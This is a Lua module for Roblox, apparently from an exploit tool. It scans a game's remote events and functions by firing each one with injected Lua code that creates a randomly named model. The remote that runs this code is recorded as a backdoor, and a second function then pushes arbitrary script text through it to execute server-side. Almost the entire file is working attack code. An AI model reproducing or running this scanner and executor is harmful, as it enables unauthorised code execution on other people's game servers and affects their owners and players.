-- Backdoor Module
local BackdoorModule = {
    FoundBackdoor = nil,
    Scanning = false
}

function BackdoorModule:Init(core)
    self.Core = core
    print("🛡️ Backdoor Module Initialized")
end

function BackdoorModule:ScanBackdoors()
    if self.Scanning then return end
    
    self.Scanning = true
    self.Core:Notify("Backdoor Scanner", "Scanning for backdoors...")
    
    local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
    
    local function generateName(length)
        local text = ''
        for i = 1, length do
            text = text .. alphabet[math.random(1, #alphabet)]
        end
        return text
    end
    
    local function runRemote(remote, data)
        if remote and (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then
            if remote:IsA('RemoteEvent') then
                pcall(function() remote:FireServer(data) end)
            elseif remote:IsA('RemoteFunction') then
                spawn(function() pcall(function() remote:InvokeServer(data) end) end)
            end
        end
    end
    
    local startTime = os.clock()
    local remotes = {}
    local code
    
    -- Scan all remotes
    for _, remote in ipairs(game:GetDescendants()) do
        if not (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then
            continue
        end
        
        -- Skip system remotes
        local splitName = string.split(remote:GetFullName(), '.')
        if splitName[1] == 'RobloxReplicatedStorage' then
            continue
        end
        
        -- Test the remote
        code = generateName(math.random(12, 30))
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    -- Check responses
    for i = 1, 50 do
        for testCode, remote in pairs(remotes) do
            if workspace:FindFirstChild(testCode) then
                local elapsedTime = os.clock() - startTime
                self.FoundBackdoor = remote
                self.Scanning = false
                
                self.Core:Notify("Backdoor Found!", "Found in " .. string.format("%.2f", elapsedTime) .. "s")
                workspace:FindFirstChild(testCode):Destroy()
                
                return true
            end
        end
        wait(0.1)
    end
    
    self.Scanning = false
    self.Core:Notify("Backdoor Scanner", "No backdoor found :(")
    return false
end

function BackdoorModule:ExecuteBackdoorScript(scriptText)
    if not self.FoundBackdoor then
        self.Core:Notify("Backdoor Error", "No backdoor found! Scan first.")
        return false
    end
    
    local function runRemote(remote, data)
        if remote and (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then
            if remote:IsA('RemoteEvent') then
                pcall(function() remote:FireServer(data) end)
            elseif remote:IsA('RemoteFunction') then
                spawn(function() pcall(function() remote:InvokeServer(data) end) end)
            end
        end
    end
    
    runRemote(self.FoundBackdoor, scriptText)
    self.Core:Notify("Backdoor", "Script executed on all players!")
    return true
end

return BackdoorModule
